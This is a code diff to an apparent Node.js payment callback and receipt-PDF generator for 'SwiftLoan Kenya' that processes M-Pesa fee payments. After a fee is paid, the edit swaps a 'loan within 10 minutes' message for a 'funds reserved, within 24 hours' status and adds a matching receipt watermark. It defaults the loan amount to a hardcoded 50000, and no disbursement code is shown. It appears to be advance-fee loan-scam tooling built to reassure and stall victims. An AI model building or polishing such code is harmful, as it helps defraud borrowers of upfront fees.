@@ -179,18 +179,23 @@ app.post("/callback", (req, res) => {
     "N/A";
 
   if ((status === "completed" && data.success === true) || resultCode === 0) {
-    receipts[ref] = {
-      reference: ref,
-      transaction_id: data.transaction_id,
-      transaction_code: data.result?.MpesaReceiptNumber || null,
-      amount: data.result?.Amount || existingReceipt.amount || null,
-      loan_amount: existingReceipt.loan_amount || "50000",
-      phone: data.result?.Phone || existingReceipt.phone || null,
-      customer_name: customerName,
-      status: "success",
-      status_note: `Loan withdrawal successful and fee payment accepted ,You will receive your Approved loan within the next 10 minutes Contact support if withdrawal persists,Regards swift loan..`,
-      timestamp: data.timestamp || new Date().toISOString(),
-    };
+  receipts[ref] = {
+    ...existingReceipt,
+    reference: ref,
+    transaction_id: data.transaction_id,
+    transaction_code: data.result?.MpesaReceiptNumber || null,
+    amount: data.result?.Amount || existingReceipt.amount,
+    loan_amount: existingReceipt.loan_amount || "50000",
+    phone: data.result?.Phone || existingReceipt.phone,
+    customer_name: customerName,
+    status: "processing",   // ✅ money confirmed, loan processing
+    status_note: `✅ Your fee payment has been received and verified.  
+Loan Reference: ${ref}.  
+Your loan is now in the final processing stage and funds are reserved for disbursement.  
+You will receive the amount in your selected account within 24 hours ,an sms will be sent to you.
+Thank you for choosing SwiftLoan Kenya.`,
+    timestamp: data.timestamp || new Date().toISOString(),
+  };
    } else {
   // Default note from Safaricom / aggregator
   let statusNote = data.result?.ResultDesc || "Payment failed or was cancelled.";
@@ -271,18 +276,30 @@ function generateReceiptPDF(receipt, res) {
   let watermarkColor = "green";
 
   if (receipt.status === "success") {
-    headerColor = "#2196F3";
-    watermarkText = "PAID";
-    watermarkColor = "green";
-  } else if (["cancelled", "error", "stk_failed"].includes(receipt.status)) {
-    headerColor = "#f44336";
-    watermarkText = "FAILED";
-    watermarkColor = "red";
-  } else if (receipt.status === "pending") {
-    headerColor = "#ff9800";
-    watermarkText = "PENDING";
-    watermarkColor = "gray";
-  }
+  headerColor = "#2196F3";    // Blue
+  watermarkText = "PAID";
+  watermarkColor = "green";
+
+} else if (["cancelled", "error", "stk_failed"].includes(receipt.status)) {
+  headerColor = "#f44336";    // Red
+  watermarkText = "FAILED";
+  watermarkColor = "red";
+
+} else if (receipt.status === "pending") {
+  headerColor = "#ff9800";    // Orange
+  watermarkText = "PENDING";
+  watermarkColor = "gray";
+
+} else if (receipt.status === "processing") {
+  headerColor = "#2196F3";    // Blue (Info look)
+  watermarkText = "PROCESSING - FUNDS RESERVED";
+  watermarkColor = "blue";
+
+} else if (receipt.status === "loan_released") {
+  headerColor = "#4caf50";    // Green
+  watermarkText = "RELEASED";
+  watermarkColor = "green";
+}
 
   // Header
   doc.rect(0, 0, doc.page.width, 80).fill(headerColor);
